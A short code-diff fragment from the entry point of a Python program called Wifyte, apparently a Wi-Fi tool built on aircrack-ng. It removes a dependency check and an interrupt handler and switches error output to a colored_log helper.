-            if shutil.which(dep) is None:
-                missing_deps.append(dep)
-
-        if missing_deps:
-            print(
-                f"{Colors.RED}[!] Error: Some dependencies are missing: {', '.join(missing_deps)}{Colors.ENDC}"
-            )
-            print(
-                f"{Colors.YELLOW}[!] Please install the aircrack-ng suite first:{Colors.ENDC}"
-            )
-            print(f"{Colors.YELLOW}    sudo apt-get install aircrack-ng{Colors.ENDC}")
-            sys.exit(1)
-
         wifyte = Wifyte()
         wifyte.run()
-    except KeyboardInterrupt:
-        print(f"\n{Colors.YELLOW}[!] Program cancelled by user{Colors.ENDC}")
     except Exception as e:
-        print(f"{Colors.RED}[!] Unexpected error: {e}{Colors.ENDC}")
+        colored_log("error", f"Unexpected error: {e}")
